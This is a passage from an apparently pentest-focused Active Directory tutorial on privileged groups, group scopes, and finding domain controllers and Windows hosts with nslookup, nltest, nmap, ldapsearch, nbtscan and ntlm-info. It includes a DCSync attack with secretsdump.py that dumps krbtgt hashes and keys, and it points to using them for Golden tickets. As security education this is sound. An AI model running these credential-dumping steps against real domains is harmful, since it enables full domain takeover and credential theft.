</span></span><span style="display:flex;"><span>DHCP Administrators</span></span></code></pre></div>
</div>
<figcaption>
List groups of the domain
</figcaption>
</figure>
<div id="outline-container-important-groups" class="outline-3">
<h3 id="important-groups">
Important groups
</h3>
<div id="outline-text-important-groups" class="outline-text-3">
<div id="outline-container-administrator-groups" class="outline-4">
<h4 id="administrator-groups">
Administrative groups
</h4>
<div id="outline-text-administrator-groups" class="outline-text-4">
<p>
In Active Directory there are many <a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#default-security-groups">default groups</a> defined for different roles in
the domain/forest. As attacker, one of the most juicy groups is the
<a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-domainadmins">Domain Admins</a> group, that gives administrator privileges to its members in the
domain, so being aware of who is this group is important.</p>
<figure>
<div class="src src-powershell">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\Users\Anakin&gt; Get-ADGroup <span style="color:#e6db74">"Domain Admins"</span> -Properties members,memberof
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>DistinguishedName <span style="color:#960050;background-color:#1e0010">:</span> CN=Domain Admins,CN=Users,DC=contoso,DC=local
</span></span><span style="display:flex;"><span>GroupCategory     <span style="color:#960050;background-color:#1e0010">:</span> Security
</span></span><span style="display:flex;"><span>GroupScope        <span style="color:#960050;background-color:#1e0010">:</span> Global
</span></span><span style="display:flex;"><span>MemberOf          <span style="color:#960050;background-color:#1e0010">:</span> {CN=Denied RODC Password Replication Group,CN=Users,DC=contoso,DC=local,
</span></span><span style="display:flex;"><span>                    CN=Administrators,CN=Builtin,DC=contoso,DC=local}
</span></span><span style="display:flex;"><span>Members           <span style="color:#960050;background-color:#1e0010">:</span> {CN=Administrator,CN=Users,DC=contoso,DC=local}
</span></span><span style="display:flex;"><span>Name              <span style="color:#960050;background-color:#1e0010">:</span> Domain Admins
</span></span><span style="display:flex;"><span>ObjectClass       <span style="color:#960050;background-color:#1e0010">:</span> group
</span></span><span style="display:flex;"><span>ObjectGUID        <span style="color:#960050;background-color:#1e0010">:</span> ac3ac095-3ea0-<span style="color:#ae81ff">4922</span>-<span style="color:#ae81ff">8130</span>-efa99ba99afa
</span></span><span style="display:flex;"><span>SamAccountName    <span style="color:#960050;background-color:#1e0010">:</span> Domain Admins
</span></span><span style="display:flex;"><span>SID               <span style="color:#960050;background-color:#1e0010">:</span> S-<span style="color:#ae81ff">1</span>-<span style="color:#ae81ff">5</span>-<span style="color:#ae81ff">21</span>-<span style="color:#ae81ff">1372086773</span>-<span style="color:#ae81ff">2238746523</span>-<span style="color:#ae81ff">2939299801</span>-<span style="color:#ae81ff">512</span></span></span></code></pre></div>
</div>
<figcaption>
Domain Admins group information
</figcaption>
</figure>
<p>
But there are also other important groups that can give you a lot of privileges,
and ones even more. This is the case of the <a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-entadmins">Enterprise Admins</a> group, which provides
administrator privileges in all the forest.</p>
<p>
The <code class="verbatim">Enterprise Admins</code> is a group that only exists in the root domain of the
forest, but is added by default to the <a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#administrators">Administrators</a> group of the all the 
domains in the forest.</p>
<p>
On the other hand, the <code class="verbatim">Domain Admins</code> group is added to the <code class="verbatim">Administrators</code>
group of the domain, as well as the <code class="verbatim">Administrators</code> groups of the domain
computers.</p>
<figure>
<pre class="example">                        .------------------------.
                        |     contoso.local      |
       .-------------------------------------------------------------.
       |                                                             |
       |                   .----------------.                        |  
       |               .--&gt;| Administrators |&lt;-.   .-&gt;Administrators |
       |               |   '----------------'  |   |     ____        | 
       |               |    .---------------.  |   |    |    |       |
       |               |    | Domain Admins |&gt;-'---'    |____|       |
       |               |    '---------------'           /::::/       |
       |               |   .-------------------.                     |
       |               '--&lt;| Enterprise Admins |                     |
       |                   '-------------------'                     |
       |                             v v                             |
       '-----------------------------|-|-----------------------------'  
                           |         | |      |                         
                           |         | |      |                         
                 .---------'         | |      '-----------.             
                 |                   v v                  |             
.----------------------------------. | | .----------------------------------.
|        it.contoso.local          | | | |        hr.contoso.local          |
|----------------------------------| | | |----------------------------------|
|                                  | v v |                                  |
|        .----------------.        | | | |        .----------------.        |
|     .-&gt;| Administrators |&lt;---------' '---------&gt;| Administrators |&lt;-.     |
|     |  '----------------'        |     |        '----------------'  |     |
|     |  .---------------.         |     |        .---------------.   |     |
|     '-&lt;| Domain Admins |         |     |        | Domain Admins |&gt;--'     |
|        '---------------'         |     |        '---------------'         |
|                |                 |     |                |                 |
|        .-------'---------.       |     |        .-------'---------.       |
|        |                 |       |     |        |                 |       |
|        v                 v       |     |        v                 v       |
| Administrators    Administrators |     | Administrators    Administrators |
|       ____              ____     |     |      ____              ____      |
|      |    |            |    |    |     |     |    |            |    |     |
|      |____|            |____|    |     |     |____|            |____|     |
|      /::::/            /::::/    |     |     /::::/            /::::/     |
'----------------------------------'     '----------------------------------'
</pre>
<figcaption>
Administrators groups memberships in forest
</figcaption>
</figure>
</div>
</div>
<div id="outline-container-other-important-groups" class="outline-4">
<h4 id="other-important-groups">
Other important groups
</h4>
<div id="outline-text-other-important-groups" class="outline-text-4">
<p>
But there are other <a href="https://adsecurity.org/?p=3700">important groups</a> to be taken into account:</p>
<dl>
<dt>
DNSAdmins
</dt>
<dd>The <a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-dnsadmins">DNSAdmins</a> group can allow to its members to
<a href="https://www.semperis.com/blog/dnsadmins-revisited/">execute code in Domain Controllers</a> as <code class="verbatim">SYSTEM</code> by using an arbitrary DLL.</dd>
<dt>
Protected Users
</dt>
<dd>
<p>The <a href="https://docs.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group">Protected Users</a> group allows to enforce the security
of accounts. Their members are not allowed to:</p>
<ul>
<li>Authenticate with NTLM (only Kerberos).</li>
<li>Use DES or RC4 encryption types in Kerberos pre-authentication.</li>
<li>Be delegated with unconstrained or constrained delegation.</li>
<li>Renew the Kerberos TGTs beyond the initial four-hour lifetime.</li>
</ul>
<p>This can frustrate attempts to abuse of these account through <a href="https://en.hackndo.com/ntlm-relay/">NTLM relay</a> or
<a href="https://www.tarlogic.com/en/blog/kerberos-iii-how-does-delegation-work/">Kerberos Delegation</a> attacks.</p>
</dd>
<dt>
Schema Admins
</dt>
<dd>The <a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#schema-admins">Schema Admins</a> can modify the Active Directory <a href="#database">database</a>
schema.</dd>
<dt>
Account Operators
</dt>
<dd>The <a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-accountoperators">Account Operators</a> group can modify the members of
many groups of the domain, excluding many of the administrators groups.
However it can modify the Server Operators group.</dd>
<dt>
Backup Operators
</dt>
<dd>The members of <a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#backup-operators">Backup Operators</a> can back up and restore
files in Domain Controllers (they also can log in to them). This could allow
to modify files in Domain Controllers.</dd>
<dt>
Print Operators
</dt>
<dd>The <a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#print-operators">Print Operators</a> can log into the Domain Controllers.</dd>
<dt>
Server Operators
</dt>
<dd>The <a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#server-operators">Server Operators</a> can log on in Domain Controllers and
manage its configuration.</dd>
<dt>
Remote Desktop Users
</dt>
<dd>The members of <a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-remotedesktopusers">Remote Desktop Users</a> can log on in a
Domain Controller through <a href="#rdp">RDP</a>.</dd>
<dt>
Group Policy Creator Owners
</dt>
<dd>The members of <a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#group-policy-creator-owners">Group Policy Creator Owners</a> can
edit <a href="#group-policy">GPOs</a> in the domain.</dd>
</dl>
<p>There are many other <a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#replicator">groups described in Microsoft docs</a>. Moreover, many
organizations add custom groups that can be also very privileged, like those
used by the IT members.</p>
<p>
Moreover, many software (especially Microsoft software) add its own groups for
management, like <a href="#exchange">Exchange</a>, that can <a href="https://adsecurity.org/?p=4119">add privileged groups</a> like
<code class="verbatim">Exchange Windows Permissions</code>, that can allow an user to perform a DCSync
attack (if not correctly updated).</p>
</div>
</div>
</div>
</div>
<div id="outline-container-group-scope" class="outline-3">
<h3 id="group-scope">
Group Scope
</h3>
<div id="outline-text-group-scope" class="outline-text-3">
<p>
In Active Directory there are three different types of groups based on <a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#group-scope">their
scope</a>. To understand them will allow to comprehend how domains and forest can be
managed:</p>
<ul>
<li>The <strong>Universal groups</strong>, that can have members from the same forests and grant
permissions in the same forest or trusted forests. The <code class="verbatim">Enterprise Admins</code>
group is an example of Universal group.</li>
<li>The <strong>Global groups</strong>, that can only have members of the same domain, and grants
permissions in domains of the same forest or trusting domains or forests. The
<code class="verbatim">Domain Admins</code> group is an example of Global group.</li>
<li>Finally, the <strong>DomainLocal groups</strong> can have members from the domain or any
trusted domain and grants permissions only in their domains. The
<code class="verbatim">Administrators</code> group is an example of DomainLocal groups.</li>
</ul>
<p>
Apart from that, you should be also know that <strong>domain groups (and domain users)
can be members of computer local groups</strong>. For example, the <code class="verbatim">Domain Admins</code> group
is added by default to the <code class="verbatim">Administrators</code> local group of a machine.</p>
</div>
</div>
</div>
</div>
<div id="outline-container-computers" class="outline-2">
<h2 id="computers">
Computers
</h2>
<div id="outline-text-computers" class="outline-text-2">
<p>
Of course, the computers are central a piece of Active Directory. As we have
said, they are the machines were all the operations occurs, but also users of
the Active Directory, that needs to be connected with the Domain Controllers.</p>
<p>
In every domain there are three types of computers:</p>
<ul>
<li><strong>Domain Controllers</strong>: The central servers that manage the domain. They are
Windows Server machines.</li>
<li><strong>Workstations</strong>: The personal computers used by people every day. These
machines are usually Windows 10 or 7 machines.</li>
<li><strong>Servers</strong>: The computers that offers services such as webs, files or
databases. They are usually Linux or Windows Server machines.</li>
</ul>
<div id="outline-container-domain-controllers" class="outline-3">
<h3 id="domain-controllers">
Domain Controllers
</h3>
<div id="outline-text-domain-controllers" class="outline-text-3">
<p>
 The Domain Controller, as we have said, is the <strong>central server of a domain</strong>,
 that is running the <a href="https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/virtual-dc/active-directory-domain-services-overview">Active Directory Domain Service</a> (AD DS). That means that is 
 responsible of keeping the domain database with all the information about domain
 objects and offering the Active Directory services, such as authentication,
 authorization, name resolution, etc. Is a Windows Server machine.</p>
<p>
 The database is stored in the file <code class="verbatim">C:\Windows\NTDS\ntds.dit</code> of
 the domain controllers. Therefore if someone steals this file, she can access to
 all the information about the objects of the domain (computers, users, group,
 policies, etc), including users credentials. Therefore, the access to this file,
 and to the Domain Controllers should be restricted to the domain administrators.</p>
<p>
 This contrasts with the fact that <strong>any computer in the domain must be able to
 talk with the Domain Controller</strong> in order to ask for information of this
 database. So the Domain Controller (at least one of them) should be reachable
 from any part of the network.</p>
<p>
 Usually, in a domain there is more than one Domain Controller, in order to
 distribute the workload and prevent single point of failures. Additionally, as
 any other database server, Domain Controllers must be synchronized with each
 other to keep the data up to date.</p>
<p>
 Moreover, in order to allow computers and users to access the database data, the
 Domain Controllers provides a series of services like DNS, Kerberos, LDAP, SMB,
 RPC, etc.</p>
<div id="outline-container-domain-controllers-discovery" class="outline-4">
<h4 id="domain-controllers-discovery">
Domain Controllers discovery
</h4>
<div id="outline-text-domain-controllers-discovery" class="outline-text-4">
<p>
It is clear that domains controller are one of the most important pieces of
Active Directory, and due to this, they are often targeted in a pentest, so it
is important to identify them, which is not very difficult.</p>
<p>
Due to the wide range of services offered by the domain controller, there are
many ways to identify the domain controllers of a domain.</p>
<p>
One possibility that doesn't require any type of authentication is to make a
simple <strong>DNS query asking for the LDAP servers</strong> of the domain (which are the
domain controllers):</p>
<figure>
<div class="src src-powershell">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\Users\Anakin&gt; nslookup -q=srv _ldap._tcp.dc._msdcs.contoso.local
</span></span><span style="display:flex;"><span>Server<span style="color:#960050;background-color:#1e0010">:</span>  UnKnown
</span></span><span style="display:flex;"><span>Address<span style="color:#960050;background-color:#1e0010">:</span>  <span style="color:#ae81ff">192.168</span>.100.2
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>_ldap._tcp.dc._msdcs.contoso.local      SRV service location<span style="color:#960050;background-color:#1e0010">:</span>
</span></span><span style="display:flex;"><span>          priority       = <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>          weight         = <span style="color:#ae81ff">100</span>
</span></span><span style="display:flex;"><span>          port           = <span style="color:#ae81ff">389</span>
</span></span><span style="display:flex;"><span>          svr hostname   = dc01.contoso.local
</span></span><span style="display:flex;"><span>_ldap._tcp.dc._msdcs.contoso.local      SRV service location<span style="color:#960050;background-color:#1e0010">:</span>
</span></span><span style="display:flex;"><span>          priority       = <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>          weight         = <span style="color:#ae81ff">100</span>
</span></span><span style="display:flex;"><span>          port           = <span style="color:#ae81ff">389</span>
</span></span><span style="display:flex;"><span>          svr hostname   = dc02.contoso.local
</span></span><span style="display:flex;"><span>dc01.contoso.local      internet address = <span style="color:#ae81ff">192.168</span>.100.2
</span></span><span style="display:flex;"><span>dc02.contoso.local      internet address = <span style="color:#ae81ff">192.168</span>.100.<span style="color:#ae81ff">3</span></span></span></code></pre></div>
</div>
<figcaption>
DNS query to identify domain controllers
</figcaption>
</figure>
<p>
Also, you can use some system utility like <code>nltest</code> to get the domain
controllers, but you require have an user.</p>
<figure>
<div class="src src-powershell">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\Users\Anakin&gt; nltest /dclist<span style="color:#960050;background-color:#1e0010">:</span>contoso.local
</span></span><span style="display:flex;"><span>Get list of DCs <span style="color:#66d9ef">in</span> domain <span style="color:#e6db74">'contoso.local'</span> from <span style="color:#e6db74">'\\dc01.contoso.local'</span>.
</span></span><span style="display:flex;"><span>    dc01.contoso.local [<span style="color:#66d9ef">PDC]  [DS</span>] Site<span style="color:#960050;background-color:#1e0010">:</span> Default-First-Site-Name
</span></span><span style="display:flex;"><span>    dc02.contoso.local        [<span style="color:#66d9ef">DS</span>] Site<span style="color:#960050;background-color:#1e0010">:</span> Default-First-Site-Name
</span></span><span style="display:flex;"><span>The command completed successfully</span></span></code></pre></div>
</div>
<figcaption>
Identify domain controllers with nltest
</figcaption>
</figure>
<p>
Moreover, if you do a port scan of a machine and the result is similar to the
following, surely is a domain controller:</p>
<figure>
<div class="src src-text">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>$ nmap 192.168.100.2 -Pn -sV -p-
</span></span><span style="display:flex;"><span>Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
</span></span><span style="display:flex;"><span>Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-04 11:17 CEST
</span></span><span style="display:flex;"><span>Nmap scan report for 192.168.100.2
</span></span><span style="display:flex;"><span>Host is up (0.00068s latency).
</span></span><span style="display:flex;"><span>Not shown: 65509 filtered ports
</span></span><span style="display:flex;"><span>PORT      STATE SERVICE       VERSION
</span></span><span style="display:flex;"><span>42/tcp    open  tcpwrapped
</span></span><span style="display:flex;"><span>53/tcp    open  domain        Simple DNS Plus
</span></span><span style="display:flex;"><span>88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-05-04 09:19:44Z)
</span></span><span style="display:flex;"><span>135/tcp   open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
</span></span><span style="display:flex;"><span>389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: contoso.local0., Site: Default-First-Site-Name)
</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds?
</span></span><span style="display:flex;"><span>464/tcp   open  kpasswd5?
</span></span><span style="display:flex;"><span>593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span><span style="display:flex;"><span>636/tcp   open  tcpwrapped
</span></span><span style="display:flex;"><span>3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: contoso.local0., Site: Default-First-Site-Name)
</span></span><span style="display:flex;"><span>3269/tcp  open  tcpwrapped
</span></span><span style="display:flex;"><span>3389/tcp  open  ms-wbt-server Microsoft Terminal Services
</span></span><span style="display:flex;"><span>5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
</span></span><span style="display:flex;"><span>9389/tcp  open  mc-nmf        .NET Message Framing
</span></span><span style="display:flex;"><span>49666/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span>49667/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span>49668/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span>49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span><span style="display:flex;"><span>49671/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span>49673/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span>49676/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span>49677/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span>49680/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span>49685/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span>49707/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span>Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span>Nmap done: 1 IP address (1 host up) scanned in 164.31 seconds</span></span></code></pre></div>
</div>
<figcaption>
Nmap service scan of a Domain Controller
</figcaption>
</figure>
<p>
This output show a lot of ports open. Here is a brief description of the service
offer by each port:</p>
<ul>
<li>42 -&gt; <a href="#netbios-name-service">WINS</a>: Centralized service to resolve NetBIOS names to IP addresses.</li>
<li>53 -&gt; <a href="#dns">DNS</a>: Service to resolve DNS names to IP addresses.</li>
<li>88 -&gt; <a href="#kerberos">Kerberos</a>: Used to provide Kerberos authentication to users.</li>
<li>135 -&gt; <a href="#rpc">RPC</a> Endpoint Mapper: RPC service used to find the RPC endpoints for
different RPC services.</li>
<li>139 -&gt; <a href="#netbios">NetBIOS</a> Session Service: An old alternative to TCP used by Windows
computers. It allows to transport protocols like SMB or RPC.</li>
<li>389 -&gt; <a href="#ldap">LDAP</a>: Used to query/edit the <a href="#database">domain database</a>.</li>
<li>445 -&gt; <a href="#smb">SMB</a>: Used to share files between computers. Also allow RPC calls
through named pipes. </li>
<li>464 -&gt; <a href="#kerberos">kpasswd</a>: Kerberos service used to change users passwords.</li>
<li>593 -&gt; <a href="#rpc">RPC</a> over HTTP Endpoint Mapper</li>
<li>636 -&gt; <a href="#ldap">LDAPS</a>: LDAP with SSL</li>
<li>3268 -&gt; <a href="#ldap">LDAP</a> <a href="#global-catalog">Global Catalog</a>: A service to query the Global Catalog.</li>
<li>3269 -&gt; <a href="#ldap">LDAPS</a> <a href="#global-catalog">Global Catalog</a></li>
<li>5985 -&gt; <a href="#winrm">WinRM</a>: Service to manage the machine remotely with CIM objects or
Powershell remoting.</li>
<li>9389 -&gt; <a href="#adws">ADWS</a>: Web service to query/edit the <a href="#database">domain database</a>.</li>
<li>49152-65535 <a href="#rpc">RPC</a> Endpoints: Random RPC ports where different RPC
services/interfaces listen to clients.</li>
</ul>
<p>Depending on the DC configuration you can also find the port 3389 open, which
allows <a href="#rdp">RDP</a> connections or <a href="https://docs.microsoft.com/en-US/troubleshoot/windows-server/networking/service-overview-and-network-port-requirements">many other services</a>.</p>
</div>
</div>
<div id="outline-container-domain-database-dumping" class="outline-4">
<h4 id="domain-database-dumping">
Domain database dumping
</h4>
<div id="outline-text-domain-database-dumping" class="outline-text-4">
<p>
Finally, in case you become the administrator of the domain, you may want to
dump the contents of the domain controller database in order to read some
sensitive data such as the <code class="verbatim">krbtgt</code> user credentials in order to create
<a href="https://en.hackndo.com/kerberos-silver-golden-tickets/">Golden tickets</a>.</p>
<p>
In order to extract the contents of the database, you can log in on
the domain controller and <a href="https://www.ired.team/offensive-security/credential-access-and-credential-dumping/ntds.dit-enumeration#no-credentials-ntdsutil">dumping the NTDS.dit file</a> locally with <a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc753343(v=ws.11)">ntdsutil</a> or
<a href="https://docs.microsoft.com/en-gb/windows-server/administration/windows-commands/vssadmin">vssadmin</a>, or you could perform a remote <a href="https://adsecurity.org/?p=1729">dcsync attack</a>, with the
<a href="https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump#dcsync">mimikatz lsadump::dsync</a> command or the <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py">impacket secretsdump.py</a> script.</p>
<p>
Be careful launching a DCSync attack, since if you request all the credentials
in a big domain, the DC that is responding could run out of memory and
crash!!</p>
<figure>
<div class="src src-bash">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ secretsdump.py <span style="color:#e6db74">'contoso.local/Administrator@192.168.100.2'</span> -just-dc-user krbtgt
</span></span><span style="display:flex;"><span>Impacket v0.9.21 - Copyright <span style="color:#ae81ff">2020</span> SecureAuth Corporation
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Password:
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Dumping Domain Credentials <span style="color:#f92672">(</span>domain<span style="color:#ae81ff">\u</span>id:rid:lmhash:nthash<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Using the DRSUAPI method to get NTDS.DIT secrets
</span></span><span style="display:flex;"><span>krbtgt:502:aad3b435b51404eeaad3b435b51404ee:fe8b03404a4975e7226caf6162cfccba:::
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Kerberos keys grabbed
</span></span><span style="display:flex;"><span>krbtgt:aes256-cts-hmac-sha1-96:5249e3cf829c979959286c0ee145b7e6b8b8589287bea3c83dd5c9488c40f162
</span></span><span style="display:flex;"><span>krbtgt:aes128-cts-hmac-sha1-96:a268f61e103134bb7e975a146ed1f506
</span></span><span style="display:flex;"><span>krbtgt:des-cbc-md5:0e6d79d66b4951cd
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Cleaning up...</span></span></code></pre></div>
</div>
<figcaption>
DCSync attack with secretsdump to retrieve krbtgt credentials
</figcaption>
</figure>
</div>
</div>
</div>
</div>
<div id="outline-container-windows-computers" class="outline-3">
<h3 id="windows-computers">
Windows computers
</h3>
<div id="outline-text-windows-computers" class="outline-text-3">
<p>
Apart from the Domain Controllers, there are many other Windows machines in a
domain, that are used both as workstation (usually Windows 10/8/7/Vista/XP) or
as an applications servers (usually Windows Server editions).</p>
<div id="outline-container-windows-computers-discovery" class="outline-4">
<h4 id="windows-computers-discovery">
Windows computers discovery
</h4>
<div id="outline-text-windows-computers-discovery" class="outline-text-4">
<p>
You can identify the Windows machines in a domain or network by using several
techniques.</p>
<p>
The first option, in case you domain have credentials, could be to <a href="#how-to-query-the-database">query the
domain database</a> through <a href="#ldap">LDAP</a>, that can give you both the computer names and even
the operating system.</p>
<figure>
<div class="src src-text">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>~$ ldapsearch -H ldap://192.168.100.2 -x -LLL -W -D "anakin@contoso.local" -b "dc=contoso,dc=local" "(objectclass=computer)" "DNSHostName" "OperatingSystem"
</span></span><span style="display:flex;"><span>Enter LDAP Password: 
</span></span><span style="display:flex;"><span>dn: CN=DC01,OU=Domain Controllers,DC=contoso,DC=local
</span></span><span style="display:flex;"><span>operatingSystem: Windows Server 2019 Standard Evaluation
</span></span><span style="display:flex;"><span>dNSHostName: dc01.contoso.local
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>dn: CN=WS01-10,CN=Computers,DC=contoso,DC=local
</span></span><span style="display:flex;"><span>operatingSystem: Windows 10 Enterprise
</span></span><span style="display:flex;"><span>dNSHostName: ws01-10.contoso.local
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>dn: CN=WS02-7,CN=Computers,DC=contoso,DC=local
</span></span><span style="display:flex;"><span>operatingSystem: Windows 7 Professional
</span></span><span style="display:flex;"><span>dNSHostName: WS02-7.contoso.local
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>dn: CN=SRV01,CN=Computers,DC=contoso,DC=local
</span></span><span style="display:flex;"><span>operatingSystem: Windows Server 2019 Standard Evaluation
</span></span><span style="display:flex;"><span>dNSHostName: srv01.contoso.local</span></span></code></pre></div>
</div>
<figcaption>
Search for computers of the domain
</figcaption>
</figure>
<p>
Another techniques, in case you don't have credentials, can involve scans of the
network. Windows computers have several ports open by default and they are not
usually protected by a firewall in a domain environment.</p>
<p>
For example, the <a href="#netbios-name-service">NetBIOS name service</a> listens in the port 137 and allows you to
even resolve the NetBIOS name from the IP. You can perform a NetBIOS scan by
using a tool like <a href="http://www.unixwiz.net/tools/nbtscan.html">nbtscan</a> or nmap <a href="https://nmap.org/nsedoc/scripts/nbstat.html">nbtstat</a> script.</p>
<figure>
<div class="src src-cmd">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>$ nbtscan 192.168.100.0/24
</span></span><span style="display:flex;"><span>192.168.100.2   CONTOSO\DC01                    SHARING DC
</span></span><span style="display:flex;"><span>192.168.100.7   CONTOSO\WS02-7                  SHARING
</span></span><span style="display:flex;"><span>192.168.100.10  CONTOSO\WS01-10                 SHARING
</span></span><span style="display:flex;"><span>*timeout (normal end of scan)</span></span></code></pre></div>
</div>
<figcaption>
NetBIOS scan
</figcaption>
</figure>
<p>
Also, a very popular service that listens in the port 445 is <a href="#smb">SMB</a>, heavily used
for Windows computers to communicate each other. You can perform an port scan to
discover Windows computers and you can even take advantage of the NTLM
authentication negotiation to retrieve the machine name. You can perform an scan
with <a href="https://github.com/Zer1t0/ntlm-info">ntlm-info</a> or nmap <a href="https://nmap.org/nsedoc/scripts/smb-os-discovery.html">smb-os-discovery</a> script.</p>
<figure>
<div class="src src-text">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>$ ntlm-info smb 192.168.100.0/24
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Target: 192.168.100.2
</span></span><span style="display:flex;"><span>NbComputer: DC01
</span></span><span style="display:flex;"><span>NbDomain: CONTOSO
</span></span><span style="display:flex;"><span>DnsComputer: dc01.contoso.local
</span></span><span style="display:flex;"><span>DnsDomain: contoso.local
</span></span><span style="display:flex;"><span>DnsTree: contoso.local
</span></span><span style="display:flex;"><span>Version: 10.0.17763
</span></span><span style="display:flex;"><span>OS: Windows 10 | Windows Server 2019 | Windows Server 2016
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Target: 192.168.100.7
</span></span><span style="display:flex;"><span>NbComputer: WS02-7
</span></span><span style="display:flex;"><span>NbDomain: CONTOSO
</span></span><span style="display:flex;"><span>DnsComputer: ws02-7.contoso.local
</span></span><span style="display:flex;"><span>DnsDomain: contoso.local
</span></span><span style="display:flex;"><span>Version: 6.1.7601
</span></span><span style="display:flex;"><span>OS: Windows 7 | Windows Server 2008 R2
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Target: 192.168.100.10
</span></span><span style="display:flex;"><span>NbComputer: WS01-10
</span></span><span style="display:flex;"><span>NbDomain: CONTOSO
</span></span><span style="display:flex;"><span>DnsComputer: ws01-10.contoso.local
</span></span><span style="display:flex;"><span>DnsDomain: contoso.local
</span></span><span style="display:flex;"><span>DnsTree: contoso.local
</span></span><span style="display:flex;"><span>Version: 10.0.19041
</span></span><span style="display:flex;"><span>OS: Windows 10 | Windows Server 2019 | Windows Server 2016</span></span></code></pre></div>
</div>
<figcaption>
SMB scan
</figcaption>
</figure>
<p>
